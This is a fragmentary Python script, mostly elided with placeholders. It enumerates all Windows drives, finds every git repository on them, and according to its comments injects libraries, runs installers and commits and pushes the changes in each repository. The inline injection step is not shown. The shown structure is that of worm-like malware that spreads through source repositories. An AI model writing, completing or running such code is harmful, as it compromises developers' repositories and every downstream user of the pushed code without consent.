...
def get_available_drives():
    ...
    drives = []
    for letter in range(67, 91):  # C to Z
        drive = f"{chr(letter)}:\\"
...
def scan_and_inject(scan_roots=None):
    ...
    # First pass: collect all git roots and relevant files
    for scan_root in roots:
        ...
        for root, dirs, files in os.walk(scan_root):
            ...
            # Check for .git directory -> this is a git root
            if '.git' in dirs:
                git_roots.add(root)
                # Do not continue walking inside .git (already excluded by dirs filter)
    ...
    # Inject libraries and run installers
    ...
    # Commit and push changes in each git repo
...
if __name__ == '__main__':
    if sys.platform != 'win32':
        sys.exit(0)
    # Run globally across all drives (original behavior)
    scan_and_inject()